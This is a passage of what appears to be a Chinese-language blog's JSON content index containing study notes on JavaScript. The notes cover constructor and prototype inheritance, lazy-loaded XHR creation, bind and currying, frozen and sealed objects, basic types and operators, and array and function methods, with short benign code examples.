sides;                    this.getArea = function(){                         return 0;                    };               } else {                    return new Polygon(sides);               }          }          function Rectangle(width, height){               Polygon.call(this, 2);                    // 因为这个this, 不属于Polygon的this               this.width = width;               this.height = height;               this.getArea = function(){                    return this.width * this.height;               };          }          var rect = new Rectangle(5, 10);          alert(rect.sides); //undefined\n改正方法: 利用原型链function Polygon(sides){         if (this instanceof Polygon) {              this.sides = sides;              this.getArea = function(){                   return 0;              };         } else {              return new Polygon(sides);         }    }    function Rectangle(width, height){         Polygon.call(this, 2);          //构造函数本身扩展到这里         this.width = width;         this.height = height;         this.getArea = function(){              return this.width * this.height;         };    }    Rectangle.prototype = new Polygon();    var rect = new Rectangle(5, 10);    alert(rect.sides); //2\n函数加载优化技巧普通情况下调用函数:function createXHR() {     if (typeof XMLHttpRequest != \"undefined\") {       return new XMLHttpRequest();     } else if (typeof ActiveXObject != \"undefined\") {       if (typeof arguments.callee.activeXString != \"string\") {         var versions = [\"MSXML2.XMLHttp.6.0\", \"MSXML2.XMLHttp.3.0\", \"MSXML2.XMLHttp\"], i, len;         for (i = 0, len = versions.length; i &lt; len; i++) {           try {             new ActiveXObject(versions[i]);             arguments.callee.activeXString = versions[i];             break;           } catch (ex) {             //跳过           }         }       }       return new ActiveXObject(arguments.callee.activeXString);     } else {       throw new Error(\"No XHR object available.\");     }   }\n缺点:每一次判断和循环造成性能上的损失\n解决方案:惰性载入(1)执行代码的时候损失性能function createXHR(){ if (typeof XMLHttpRequest != \"undefined\"){      createXHR = function(){           return new XMLHttpRequest();      }; } else if (typeof ActiveXObject != \"undefined\"){     createXHR = function(){     if (typeof arguments.callee.activeXString != \"string\"){        var versions = [          \"MSXML2.XMLHttp.6.0\",           \"MSXML2.XMLHttp.3.0\",          \"MSXML2.XMLHttp\"        ], i, len;        for (i=0,len=versions.length; i &lt; len; i++){           try {              new ActiveXObject(versions[i]);              arguments.callee.activeXString = versions[i];              break;           } catch (ex){            //skip           }       }     }     return new ActiveXObject(arguments.callee.activeXString);   }; } else {      createXHR = function(){           throw new Error(\"No XHR object available.\");      };   }   return createXHR(); }\n解决方案:惰性载入(2)var createXHR = (function () {  if (typeof XMLHttpRequest != \"undefined\") {    return function () {      return new XMLHttpRequest();    };  } else if (typeof ActiveXObject != \"undefined\") {    return function () {      if (typeof arguments.callee.activeXString != \"string\") {        var versions = [\"MSXML2.XMLHttp.6.0\", \"MSXML2.XMLHttp.3.0\",        \"MSXML2.XMLHttp\"],        i, len;        for (i = 0, len = versions.length; i &lt; len; i++) {          try {            new ActiveXObject(versions[i]);            arguments.callee.activeXString = versions[i];            break;          } catch (ex) {            //skip          }        }      }      return new ActiveXObject(arguments.callee.activeXString);    };  } else {    return function () {      throw new Error(\"No XHR object available.\");    };  }})();\n函数绑定常见问题var handler = {     message: \"Event handled\",     handleClick: function(event){          alert(this.message);     }};var btn = document.getElementById(\"my-btn\");EventUtil.addHandler(btn, \"click\", handler.handleClick);          // undefined, 出现了作用域问题\n改进: var handler = {     message: \"Event handled\",     handleClick: function(event){          alert(this.message);     }};var btn = document.getElementById(\"my-btn\");EventUtil.addHandler(btn, \"click\", function(event){               // 使用了闭包  但是尽量少用闭包     handler.handleClick(event);});\n这个解决方案在 onclick 事件处理程序内使用了一个闭包直接调用 handler.handleClick()。\n当然，这是特定于这段代码的解决方案。创建多个闭包可能会令代码变得难于理解和调试。因此，很多JavaScript 库实现了一个可以将函数绑定到指定环境的函数。这个函数一般都叫 bind()。一个简单的 bind()函数接受一个函数和一个环境，并返回一个在给定环境中调用给定函数的函数，并且将所有参数原封不动传递过去。\n语法如下：function bind(fn, context){     return function(){          return fn.apply(context, arguments);     };}\n这个函数似乎简单，但其功能是非常强大的。在 bind()中创建了一个闭包，闭包使用 apply()调用传入的函数，并给 apply()传递 context 对象和参数。注意这里使用的 arguments 对象是内部函数的，而非 bind()的。当调用返回的函数时，它会在给定环境中执行被传入的函数并给出所有参数。\nbind()函数按如下方式使用：var handler = {  message: \"Event handled\",  handleClick: function(event){    alert(this.message);  }};var btn = document.getElementById(\"my-btn\");EventUtil.addHandler(btn, \"click\", bind(handler.handleClick, handler));\nECMAS5: 存在bind方法, 但IE9及以上支持var handler = {    message: \"Event handled\",    handleClick: function(event){    alert(this.message + \":\" + event.type);    }};var btn = document.getElementById(\"my-btn\");EventUtil.addHandler(btn, \"click\", handler.handleClick.bind(handler));\n函数curry化函数柯里化（function currying） ，它用于创建已经设置好了一个或多个参数的函数。函数柯里化的基本方法和 函数绑定 是一样的：使用一个闭包返回一个函数。两者的区别在于，当函数被调用时，返回的函数还需要设置一些传入的参数。function add(num1, num2){     return num1 + num2;}function curriedAdd(num2){          // 比如说说实现 计算 和 打印 功能的分开     return add(5, num2);}alert(add(2, 3));                     //5alert(curriedAdd(3));             //8\n柯里化函数通常由以下步骤动态创建：调用另一个函数并为它传入要柯里化的函数和必要参数。下面是创建柯里化函数的通用方式。function curry(fn){   var args = Array.prototype.slice.call(arguments, 1);   return function(){        var innerArgs = Array.prototype.slice.call(arguments);        var finalArgs = args.concat(innerArgs);        return fn.apply(null, finalArgs);   };}\n防篡改对象\n不过请注意：一旦把对象定义为防篡改，就无法撤销了\n\n不可扩展对象:（第一个级别的保护）默认情况下，所有对象都是可以扩展的。也就是说，任何时候都可以向对象中添加属性和方法。var person = { name: \"Nicholas\" };person.age = 29;\n即使第一行代码已经完整定义 person 对象，但第二行代码仍然能给它添加属性。现在，使用Object.preventExtensions()方法可以改变这个行为，让你不能再给对象添加属性和方法。\n例如：var person = { name: \"Nicholas\" };Object.preventExtensions(person);person.age = 29;alert(person.age); // undefined，非严格模式下静默失败，严格模式下抛出错误\n虽然不能给对象添加新成员，但已有的成员则丝毫不受影响。你仍然还可以修改和删除已有的成员。另外，使用 Object.istExtensible()方法还可以确定对象是否可以扩展。var person = { name: \"Nicholas\" };alert(Object.isExtensible(person)); //trueObject.preventExtensions(person);alert(Object.isExtensible(person)); //false\n密封的对象（第二个级别的保护）var person = { name: \"Nicholas\" };Object.seal(person);person.age = 29;alert(person.age); //undefineddelete person.name;     // 无效 , 严格模式下抛出错误alert(person.name); //\"Nicholas\"var person = { name: \"Nicholas\" };alert(Object.isExtensible(person)); //truealert(Object.isSealed(person)); //falseObject.seal(person);alert(Object.isExtensible(person)); //falsealert(Object.isSealed(person)); //true\n冻结的对象（第三个级别的保护）var person = { name: \"Nicholas\" };Object.freeze(person);person.age = 29;alert(person.age); //undefineddelete person.name;alert(person.name); //\"Nicholas\"person.name = \"Greg\";alert(person.name); //\"Nicholas\"var person = { name: \"Nicholas\" };alert(Object.isExtensible(person)); //truealert(Object.isSealed(person)); //falsealert(Object.isFrozen(person)); //falseObject.freeze(person);alert(Object.isExtensible(person)); //falsealert(Object.isSealed(person)); //truealert(Object.isFrozen(person)); //true","url":"/2015/06/11/Advanced-Techniques/","link":"","plink":"https://thinkerchan.com/2015/06/11/Advanced-Techniques/"},{"title":"JS红皮书读书笔记-03-基本概念","content":"语法以下是js的语法要求\n\n大小写敏感\n标识符: 即我们说的变量名 开头必须是字幕/下划线/&amp;的一种\n不能把关键字/保留字/true,false,null作为标识符\n注释: \n单行注销: //\n多行注销: /** here is your code **/\n\n\n严格模式: Es5引入严格模式,在严格模式下，ECMAScript 3 中的一些不确定的行为将得到处理，而且对某些不安全的操作也会抛出错误。\n语法: 在顶部 添加 &quot;use strict&quot;; 即可\n\n\n语句: 建议每一行语句背后加分号, 哪怕这不是必须的-因为解释器会自行补充 , 不过这样会耗费时间和性能.\n\n关键字和保留字Reserved Words - JavaScript | MDN 可以查看最新的关键字和保留字\n以上都是不能作为标识符的.\n变量js声明变量的方式如下var message; // 松散型变量, 你可以赋任何值, 如果不显示赋值, 默认值为undefined\n我们看一个例子:var message = 'hi';message = 10;\n虽然我们声明了一个名为message的变量, 但并不意味着它就是字符串类型.\n再看一个例子:function test(){\tvar message = &apos;hi&apos;;}test();alert(message)\t// Uncaught ReferenceError: message is not defined\n上面的实例说明了用var定义的变量, 将会成为当前作用于的局部变量, 通常外部无法访问.\n实际上不用var也能直接声明一个变量:function test(){\tmessage = \"hi\"; // 挂载到全局}test();alert(message); // \"hi\"\n数据类型\nEs中有6种数据类型, 实际上到现在为止(2019)有7种, 不过此系列文章讨论ES5.\n\n基本数据类型:\n\nUndefined\nNull\nBoolean\nNumber\nString\n\n复杂数据类型:\n\nObject: 数组, 函数, 对象都统称为Object类型\n\ntypeof 操作符js中, 给定任意一个变量, 用typeof操作符去检验, 必然返回以下结果之一:\n\nundefined\nboolean\nstring\nnumber\nobject\nfunction\n\nUndefined类型\nUndefined 类型只有一个值，即特殊的 undefined。在使用 var 声明变量但未对其加以初始化时， 这个变量的值就是 undefined\n\nNull类型\nNull 类型是第二个只有一个值的数据类型，这个特殊的值是 null。从逻辑角度来看，null 值表示一个空对象指针，而这也正是使用 typeof 操作符检测 null 值时会返回”object”的原因\n\n实际上 undefined是派生于null\nundefined == null; // true\nBoolean类型\nBoolean 类型是 ECMAScript 中使用得最多的一种类型，该类型只有两个字面值：true 和 false。\n\n一个变量想得到对应的Boolean值, 可调用Boolean()函数\n对于一个变量s, 如果它满足以下条件之一, Boolean(s)就返回false:\n\nBoolean: false\nString: 空字符串\nNumber: 0和NaN\nObject: null\nUndefined: undefined\n\nNumber类型Number类型要注意几个关键点:\n\n浮点数精度问题: 如 0.1+0.2 != 0.3 \n以0开头八进制数字赋值时的差异: 比如 var num1 = 070,  num2 = 071; 表现不一致\n科学计数法\n数值范围有限\nNaN: NaN != NaN\n数值转换, 有三个能把非数值转换成数值的方法:\nNumber()\nparseInt(arg1,arg2)     //parseInt(“AF”, 16); 转换成10进制\nparseFloat()\n\n\n\nString类型这是一个拥有属性的基本类型(实际上数值, 布尔值, 对象和字符串值都有toString方法 ,后面的章节复习中会讲到包装类型)var str = &apos;hello&apos;;alert(str.length); //6\n字符字面量: 保留了一些\\n,\\t,\\b,\\r等转义序列, 用于表示非打印字符.\n拼接字符串效率问题?\nvar lang = &quot;Java&quot;;lang = lang + &quot;Script&quot;;\n以上示例中的变量 lang 开始时包含字符串”Java”。而第二行代码把 lang 的值重新定义为”Java” 与”Script”的组合，即”JavaScript”。实现这个操作的过程如下：\n\n首先创建一个能容纳 10 个字符的新字符串\n然后在这个字符串中填充”Java”和”Script”\n最后一步是销毁原来的字符串”Java”和字符串”Script”\n\n以上是旧浏览器(例如版本低于 1.0 的 Firefox、IE6 等)存在的问题, 目前的浏览器已经不存在字符串拼接效率问题, 所以请大胆使用.\n\n把其他数据类型(不含null, undefined)转换成字符串:\n\ntoString() \nvar num = 10;alert(num.toString());\t// &quot;10&quot;alert(num.toString(2));\t// &quot;1010&quot;alert(num.toString(8));\t// &quot;12&quot;alert(num.toString(10));\t// &quot;10&quot; alert(num.toString(16));\t// &quot;a\n\nString(): 可以转换null和undefined\nvar value1 = 10; var value2 = true; var value3 = null; var value4;alert(String(value1));\t// &quot;10&quot; alert(String(value2));\t// &quot;true&quot; alert(String(value3));\t// &quot;null&quot; alert(String(value4));\t// &quot;undefined&quot;\n\n\nObject类型创建Object对象实例通常方法:\n\n构造函数:\nvar obj1 = new Object; // 没有参数是可以省略括号的\n\n对象字面量\nvar obj2 = { };\n\n\nObject 的每个实例都具有下列属性和方法。\n\nconstructor：保存若用于创建当前对象的函数。对于前面的例子而言，构造函数（constructor）就     是 Object()。\nhasOwnProperty(propertyName)：用于检查给定的属性在当前对象实例中（而不是在实例的原型中）是否存在。其中，作为参数的属性名（propertyName）必须以字符串形式指定（例如：o.hasOwnProperty(“name”)）。\nisPrototypeOf(object)：用于检查传入的对象是否是传入对象的原型（第 5 章将讨论原型）。\npropertyIsEnumerable(propertyName)：用于检查给定的属性是否能够使用 for-in 语旬（本章后面将会讨论）来枚举。与 hasOwnProperty()方法一样，作为参数的属性名必须以字符串形式指定。\ntoLocaleString()：返回对象的字符串表示，该字符串与执行环境的地区对应。\ntoString()：返回对象的字符串表示。\nvalueOf()：返回对象的字符串、数值或布尔值表示。通常与 toString()方法的返回值相同。\n\n\n由于在 ECMAScript 中 Object 是所有对象的基础，因此所有对象都具有这些基本的属性和方法。\n\n操作符开始之前, 我们来看看一道题:var a = 1, b = 2, c = 3, d=4;var e1 = a&lt;b || b&gt;c &amp;&amp; c&lt;d || d&lt;a; //?var e2 = a&lt;b &amp;&amp; b&gt;c || c&lt;d &amp;&amp; d&lt;a; //?\n\n所以e1 , e2到底是true还是false呢? 这里就涉及到操作符优先级的问题\n\n一元操作符\n只能操作一个值的符号就叫做一元操作符, 也是ES里面最简单的操作符\n\n自增自减操作符递增和递减操作符, 其中又分前置和后置的情况, 我们看两个有意思的例子:\n前置:var num1 = 2; var num2 = 20;var num3 = --num1 + num2;\t// 等 于 21var num4 = num1 + num2;\t// 等 于 21\n后置:var num1 = 2; var num2 = 20;var num3 = num1-- + num2;\t// 等 于 22 , num1的值是计算完num3之后再修改的var num4 = num1 + num2;\t// 等 于 21\n对于这种蛋疼的现象(计算机中称为副效应), 我们可以这么记忆: \n\n在运算时, 前置先修改(因为前置的优先级和执行语句的优先级相等), 后置后修改 (笑)\n\n自增自减符, 对于任何值都适用:\n\n在应用于一个包含有效数字字符的字符串时，先将其转换为数字值，再执行加减 1 的操作。字符串变量变成数值变量。\n在应用于一个不包含有效数字字符的字符串时，将变量的值设置为 NaN（第 4 章将详细讨论）。字符串变量变成数值变量。\n在应用于布尔值 false 时，先将其转换为 0 再执行加减 1 的操作。布尔值变量变成数值变量。\n在应用于布尔值 true 时，先将其转换为 1 再执行加减 1 的操作。布尔值变量变成数值变量。\n在应用于浮点数值时，执行加减 1 的操作。\n在应用于对象时，先调用对象的 valueOf()方法（第 5 章将详细讨论）以取得一个可供操作的值。然后对该值应用前述规则。如果结果是 NaN，则在调用 toString()方法后再应用前述规则。对象变量变成数值变量。\n\n这里是一些示例:var s1 = &quot;2&quot;; var s2 = &quot;z&quot;; var b = false; var f = 1.1; var o = {\tvalueOf: function() { \t\treturn -1;\t}};s1++;\t// 值变成数值 3s2++;\t// 值变成 NaNb++;\t// 值变成数值 1f--;\t// 值变成 0.10000000000000009（由于浮点舍入错误所致） o--;\t// 值变成数值-2\n\n加减操作符\n略\n\n位操作符讲这个之前, 自行了解下一下二进制码, 反码, 补码的概念. 可以点击此处查看相关内容, 我这里只简单说说\n我们首先记住一个规定(反正是计算机科学家规定的):\n\n用32为的二进制数才存储数值 , 从右往左开始, 为第1位到第32位, 第32位是用来做符号位, 0表示正数, 1表示负数.\n\n正数以纯二进制格式存储.\n如18这个十进制数:它的二进制数表示为: 10010 \n至于-18, 则用经过三个计算步骤用补码表示:\n\n计算该数绝对值的二进制码: 00000000 00000000 00000000 00010010\n求反: 11111111 11111111 11111111 11101101\n反码加1: 11111111 11111111 11111111 11101110\n\n所以 -18 的二进制表示是: 11111111 11111111 11111111 11101110\n你可能看到这里头都大了, 为啥看起来这么复杂,  那我们就来讨论一下这个问题, 这回我们不用32位的二进制数, 我们用8位二进制数来做demo:\n8位二进制数, 如果只用来表示正数 那么:\n\n最小值: 0000 0000\n最大值: 1111 1111看着没毛病\n\n但是要表示正负数, 并且计算基只认识0和1, 那我们只好用第8位来做符号位 :\n\n非负数数值范围: [0000 0000, 0111 1111], 也就是[0,127]\n负数范围: [1000 0000, 11111111], 也就是[0,-127]\n\n根据常识, 一个正数要加上另一个数字等于0 , 那么这个数字肯定是它的相反数比如 1+(-1) = 0\n我们再回到八位二进制数:1表示成: 0000 0001-1表示成: 1000 0001(我知道长这样它才是你心目中的-1)\n那么: 0000 0001 + 1000 0001 = 1000 0010\n\n1000 0010等于0吗?\n\n显然1000 0010长得又不像你心目中的0(实际上也不是)\n我们假设: 0000 0001+ x = 0000 0000 (注意这里并不是1000 0000)得到x = 1111 1111 也就是-1 \n\n此处参考了 wenxinwukui234的博客\n\n\n实际上 0000 0001+ 1111 1111 = 1 0000 0000 产生了溢出问题\n\n但是根据前面计算补码的规则:绝对值: 0000 0001求反: 1111 1110加一: 1111 1111 (和我们之前计算的一致)\n\n非(NOT): ~ , 求反码\n与(AND): &amp; , 二进制同时有1才取1\n或(OR): | , 二进制有1取1\n按位异或(XOR): ^ , 二进制相同的数取0 , 不同则取1\n左移:&lt;&lt;\n右移:&gt;&gt;\n\n布尔操作符\n逻辑非(!)\n逻辑与(&amp;)\n逻辑或(||)\n\n乘性操作符\n乘法(*)\n除法(/)\n求模(%)\n\n加性操作符\n加法(+): 数值 + 字符串 == 字符串\n减法(-):  数值 - 字符串 == 数值\n\n关系操作符字符串比较大小的时候, 是比较字符编码位置的大小 , 如果是对象比较, 会先调用valueOf方法, 如果没有valueOf方法, 就调用toString方法\n\n大于(&gt;)\n小于(&gt;)\n\n相等操作符以下的操作符会进行强制类型转换, 再比较相等性\n\n相等(==)\n不相等(!=)\n\n\n在转换不同的数据类型时，相等和不相等操作符遵循下列基本规则：\n\n如果有一个操作数是布尔值，则在比较相等性之前先将其转换为数值 false 转换为 0，而true 转换为 1；\n如果一个操作数是字符串，另一个操作数是数值，在比较相等性之前先将字符串转换为数值\n如果一个操作数是对象，另一个操作数不是，则调用对象的 valueOf()方法，用得到的基本类型值按照前面的规则进行比较\nnull == undefined \nNaN != NaN\n对象和对象的相等检测, 会判断是不是指向同一个对象\n\n\n\n全等(===) : 不会进行强制类型转换\n\n条件操作符也就是通常我们所说的三元操作符: var s = bool? true : false;\n赋值操作符以下是常见的赋值操作符, 不过使用这些并不会带来性能上的提升, 取决于你的爱好\n\n+=\n-=\n*=\n/=\n%=\n&lt;&lt;=\n>>=\n\n逗号操作符只需要记住\n\nvar num1=1, num2=2, num3=3;  // 声明变量时候的简约方式\nvar num = (5, 1, 4, 8, 0);   // num 的值为 0\n\n语句if语句略\ndo-while语句\ndo-while循环至少会执行一次\n\nwhile语句略\nfor语句略\nfor-in语句\nfor-in 语旬是一种精准的迭代语旬，可以用来枚举对象的属性。\n\n以下是 for-in 语旬的语法：for (var propName in window) { \tconsole.log(propName);}\n在这个例子中，我们使用 for-in 循环来显示了 BOM 中 window 对象的所有属性。每次执行循环时，都会将 window 对象中存在的一个属性名赋值给变量 propName。这个过程会一直持续到对象中的所有属性都被枚举一遍为止。\n与 for 语旬类似，这里控制语旬中的 var 操作符也不是必需的。但是， 为了保证使用局部变量，我们推荐上面例子中的这种做法。\nECMAScript 对象的属性没有顺序。因此，通过 for-in 循环输出的属性名的顺序是不可预测的。具体来讲，所有属性都会被返回一次，但返回的先后次序可能会因浏览器而异。但是，如果表示要迭代的对象的变量值为  null 或  undefined，for-in 语旬会抛出错误, ECMAScript 5 更正了这一行为；对这种情况不再抛出错误，而只是不执行循环体。\nlabel语句\n不建议使用\n\nbreak和continue语句\n不建议使用\n\nwith语句\n不建议使用, 会改变上下文环境, 而且有性能问题\n\nswitch语句\n如果你的if..else if..不合理, 那需要考虑用这个\n\n函数\n函数对任何语言来说都是一个核心的概念。通过函数可以封装任意多条语旬，而且可以在任何地方、任何时候调用执行。ECMAScript 中的函数使用 function 关键字来声明，后跟一组参数以及函数体。\n\n以下是一个函数示例：function sayHi(name, message) { \talert(\"Hello \" + name + \",\" + message);\t//return ; //不必指定是否有返回值}\n理解参数\n你可以传无限个参数,  也不介意你的参数是什么类型, 因为函数内部有一个叫arguments的类数组对象( arguments  instanceof   Array == false)\n\n我们来看一个例子:function doAdd(num1, num2) { \targuments[1] = 10; \tconsole.log(arguments[0] + num2);}doAdd(10); //NaN , 说明形参和arguments[n]都是独立的, 但是值会根据实参同步个数doAdd(10,0);\t// 20\n没有重载\nES没有重载, 但是可以通过判断参数的长度来模拟","url":"/2019/03/21/JSbook03/","link":"","plink":"https://thinkerchan.com/2019/03/21/JSbook03/"},{"title":"JS红皮书读书笔记-05-引用类型","content":"Object创建Object对象的方法:\n\nnew Object\n对象字面量(不会调用Object构造函数)\n\n其他知识点:\n\n通常用点运算符访问对象的熟悉\n如非必要, 避免[“prop”]访问对象熟悉\n如果函数需要大量传参, 可以用对象作为参数\n\nArray创建方式:\n\nnew Array, 也可以省略new关键字i\nvar arr = new Array(10); arr.length==10\nvar arr = new Array(‘a’,’b’); arr == [‘a’,’b’]  \n\n\nvar arr = [], 不会调用Array构造函数\nvar values = [1,2,]; 不要有空项, 不同浏览器识别不一致\n\n\nlength不是只读的, 可以手动修改\n可以利用这个属性代替arr.push的操作\n\n\n\n知识点:\n检测数组\ninstanceof\nArrary.isArray( )\nconstructor属性(不过不建议用这个, 可以被修改)\nobj.toString.call(arr), 为什么不用自身的toString要用对象的toString方法来检测, 我们看示例:({}).toString();\t//'[object Object]'([1,2,3]).toString();\t//'1,2,3'\n\n\n转换方法上面的示例也涉及到一个数组的转换方法, 我这里再列出来(不过这些都是所有对象都有的方法):\n\ntoLocaleString(); 数组实例调用这个方法,其中的每一项也会调用\ntoString();同上\nvalueOf()\n\n数组特有:\n\njoin, 解释略\n\n栈方法栈是一种后进先出的数据结构，也就是最新添加的项最早被移除。而栈中项的插入（叫做推入）和移除（叫做弹出），只发生在一个位置栈的顶部。对应方法为: push和pop, 请看示例:var colors = new Array(); // 创建一个数组var count = colors.push(\"red\", \"green\"); // 推入两项alert(count);  //2count = colors.push(\"black\"); // 推入另一项alert(count); //3var item = colors.pop();  // 取得最后一项alert(item);  //\"black\" alert(colors.length); //2\n队列方法栈数据结构的访问规则是 LIFO（后进先出），而队列数据结构的访问规则是 FIFO（First-In-First-Out， 先进先出）。队列在列表的未端添加项，从列表的前端移除项。由于 push()是向数组未端添加项的方法， 因此要模拟队列只需一个从数组前端取得项的方法。实现这一操作的数组方法就是 shift()，它能够移除数组中的第一个项并返回该项，同时将数组长度减 1。结合使用 shift()和 push()方法，可以像使用队列一样使用数组。\n看示例:var colors = new Array(); //创建一个数组var count = colors.push(\"red\", \"green\");  //推入两项alert(count); //2count = colors.push(\"black\"); //推入另一项alert(count);  //3var item = colors.shift();  //取得笫一项alert(item);  //\"red\" alert(colors.length); //2\n另外还有一个unshift方法 , 和shift方法功能相反\n重排序方法数组中已经存在两个可以直接用来重排序的方法：reverse()和 sort(), 两个方法都会修改原数组。sort方法会调用数组中的每一项的toString方法,得到其中的字符串之后, 在做排序对比.\n我们来看一个示例:var values = [0, 1, 5, 10, 15]; values.sort();alert(values);  //0,1,10,15,5, 这里并没有按我们想要的来排序\n我们给sort加一个比较函数作为参数:function compare(value1, value2) {   if (value1 &lt; value2) {  return 1;  } else if (value1 &gt; value2) {  return -1;  } else {  return 0;  }}var values = [0, 1, 5, 10, 15]; values.sort(compare); alert(values);  // 15,10,5,1,0\n操作方法\nconcat, 返回被修改的副本\nslice(start,end), 返回被删除的数组,  一般用于克隆数组(浅复制) .通常用[].slice.call(arrayLike)来转换成数组\nsplice(start [, deleteCount, insretItem1, insretItem2, ….] )  // 返回被删除的数组: var x = [1,2,3,4,5,6];x.splice(1,1,'x')//[2]alert(x) //[1,'x',3,4,5,6]\n\n\n位置方法\nindexOf()\nlastIndexOf()\n\n迭代方法\nevery()：对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。\nfilter()：顾名思义, 过滤所需要的数组元素, 对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组。\nsome()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。\nforEach()：对数组中的每一项运行给定函数。这个方法没有返回值。\nmap()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。以上5种方法都不会修改数组中的包含的值。\n\nevery,some比较类似:var numbers = [1,2,3,4,5,4,3,2,1];var everyResult = numbers.every(function(item, index, array){   return (item &gt; 2);});alert(everyResult); //falsevar someResult = numbers.some(function(item, index, array){   return (item &gt; 2);});alert(someResult);  //true\n我们看一个map的示例:var numbers = [1,2,3,4,5,4,3,2,1];var mapResult = numbers.map(function(item, index, array){ \t// 所以map的回调函数有三个参数, 数组项, 索引, 数组本身  return item * 2;});alert(mapResult); //[2,4,6,8,10,8,6,4,2]\n我们在看一个面试题:[\"1\",\"2\",\"3\"].map(parseInt);//?\n你可能一下子想不出答案, 那我直接告诉你好了, 答案是: [1,NaN,NaN]\n如果你不明白, 可以看下面的解析, 否则直接跳过function cb(item,index,arr){\treturn item+'-'+index;\t//注意map回调方法里面要有返回值}[\"1\",\"2\",\"3\"].map(cb);\t//[\"1-0\", \"2-1\", \"3-2\"];//我们换一种写法帮助理解function _parseInt(string, radix){\treturn parseInt(string,radix) // parseInt(string,radix), 这个方法本身是有返回值的}[\"1\",\"2\",\"3\"].map(_parseInt); //[1,NaN,NaN]//所以看得出item,和index传到了parseInt对应的参数string, radix中, 而string中的数字必须小于radix, 否则转换十进制失败, 即NaN\n归并方法\nreduce\nreduceRight\n\n解析: 略\nDate只讲一个奇技淫巧, 求某个月有多少天:var getDays = function(m){  return new Date((new Date).getFullYear(),m,0).getDate()}\nRegExp请查看正则表达式教程\nFunction每个函数都是 Function 类型的实例，而且都与其他引用类型一样具有属性和方法。由于函数是对象，因此函数名实际上也是一个指向函数对象的指针，不会与某个函数绑定。\n三种使用方式:函数声明:function sum (num1, num2) {   return num1 + num2;}\n 函数表达式:var sum = function (num1, num2) {   return num1 + num2;};\t//这个分号别漏了, 养成习惯\n 构造函数(不推荐):var sum = new Function(\"num1\", \"num2\", \"return num1 + num2\");\n从技术角度讲，这是一个函数表达式。但是，我们不推荐读者使用这种方法定义函数，因为这种语法会导致解析两次代码（第一次是解析常规 ECMAScript 代码，第二次是解析传入构造函数中的字符串），从而影响性能。不过，这种语法对于理解“函数是对象，函数名是指针＂的概念倒是非常直观的。\n没有重载ES函数中, 是没有重载的,如果你非得声明多个一样的函数, 那么最后声明的那个函数会覆盖之前的声明.\n函数声明和函数表达式函数声明和函数表达式虽然功能是一致的, 但是解析器对这两种方式的优先级并不一致. 解析器会率先读取函数声明,  并使其在执行任何代码之前可用（可以访问）；至于函数表达式，则必须等到解析器执行到它所在的代码行，才会真正被解释执行。\n看示例:alert(sum(10,10)); // 会正常执行function sum(num1, num2){  return num1 + num2;}\n作为值的函数略\n函数内部熟悉在函数内部，有两个特殊的对象：arguments 和 this。其中，arguments 在第 3 章曾经介绍过， 它是一个类数组对象，包含若传入函数中的所有参数。虽然 arguments 的主要用途是保存函数参数， 但这个对象还有一个名叫 callee 的属性，该属性是一个指针，指向拥有这个 arguments对象的函数。\n请看下面这个非常经典的阶乘函数:function factorial(num){   if (num &lt;=1) {    return 1;  } else {    return num * factorial(num-1)\t;//看这里, 如果外部的factorial被人改变的话, 此处的factorial也需要同时改变  }}\n于是我们可以:function factorial(num){   if (num &lt;=1) {    return 1;  } else {    return num * arguments.callee(num-1)\t;//降低耦合, 严格模式会报错  }}\nthis: 函数上下文对象, 当前执行环境对象.caller: 表示当前函数被谁调用, ES5下也有arguments.caller,值为undefined, 它的存在主要用于区别函数的caller\nps: 严格模式下, 函数.caller不能赋值, arguments.caller访问报错\n函数属性和方法属性:  前面通过caller讲了一个, 接下来还有length和prototype:length: 你可能比较少见函数的length熟悉, 它表示函数的形参长度.prototype: 我们下一章重点讲这个\n方法:  每个函数都包含两个非继承而来的方法, 这两个方法的功能类似, 区别在于第二个参数的格式不同而已call(contextObj [,arg1,arg2…])apply(contextObj, arr): arr可以是数组示例, 也可以是arguments对象\n那么这两个方法是用来干啥? 主要是用来改变指向的(但它们的基本功能还是用于改变传参方式):window.color = \"red\";var o = { color: \"blue\" };function sayColor(){    alert(this.color);}sayColor();\t//redsayColor.call(this);\t//redsayColor.call(window);\t//redsayColor.call(o);\t//blue\n你要是不好理解, 可以这么想象:\n\n函数fn打了个电话(call), 等会我要到你(环境对象)那里去玩哦, 顺便给你带点东西(参数), 既然玩完了, 那自然fn任务也完成了(说明fn会被执行完毕).\n\n使用 call()（或 apply()）来扩充作用域的最大好处，就是对象不需要与方法有任何耦合关系(例如不需要o.sayColor的存在)。可提高代码重用性。\n此外还有另一个方法: bind, 这个方法和call,apply的功能是类似的:window.color = \"red\";var o = { color: \"blue\" };function sayColor(){   alert(this.color);}var objectSayColor = sayColor.bind(o); objectSayColor();  //blue\n另外还有:\n\ntoLocaleString\ntoString\nvalueOf\n\n详解略\n基本包装类型为了便于操作基本类型值，ECMAScript 还提供了 3 个特殊的引用类型：Boolean、Number 和String。这些类型与本章介绍的其他引用类型相似，但同时也具有与各自的基本类型相应的特殊行为。     实际上，每当读取一个基本类型值的时候，后台就会创建一个对应的基本包装类型的对象，从而让我们能够调用一些方法来操作这些数据。var s1 = \"some text\";var s2 = s1.substring(2);\n这个例子中的变量 s1 包含一个字符串，字符串当然是基本类型值。而下一行调用了  s1 的substring()方法，并将返回的结果保存在了 s2 中。我们知道，基本类型值不是对象，因而从逻辑上讲它们不应该有方法（但是它们确实有方法）\n当第二行代码访问 s1 时，访问过程处于一种读取模式，也就是要从内存中读取这个字符串的值。而在读取模式中访问字符串时，后台都会自动完成下列处理。\n\n创建 String 类型的一个实例\n在实例上调用指定的方法\n销毁这个实例\n\n可以将以上三个步骤想象成是执行了下列 ECMAScript 代码。var s1 = new String(\"some text\"); var s2 = s1.substring(2);s1 = null;\n经过此番处理，基本的字符串值就变得跟对象一样了。而且，上面这三个步骤也分别适用于 Boolean和 Number 类型对应的布尔值和数字值。\n引用类型与基本包装类型的主要区别就是对象的生存期。使用 new 操作符创建的引用类型的实例， 在执行流离开当前作用域之前都一直保存在内存中。\n而自动创建的基本包装类型的对象，则只存在于一行代码的执行瞬间，然后立即被销毁。这意味若我们不能在运行时为基本类型值添加属性和方法。\n我们来看这个示例:var s1 = \"some text\"; s1.color = \"red\";alert(s1.color);  //undefined\n在此，第二行代码试图为字符串 s1 添加一个 color 属性。但是，当第三行代码再次访问 s1 时， 其 color 属性不见了。问题的原因就是第二行创建的 String 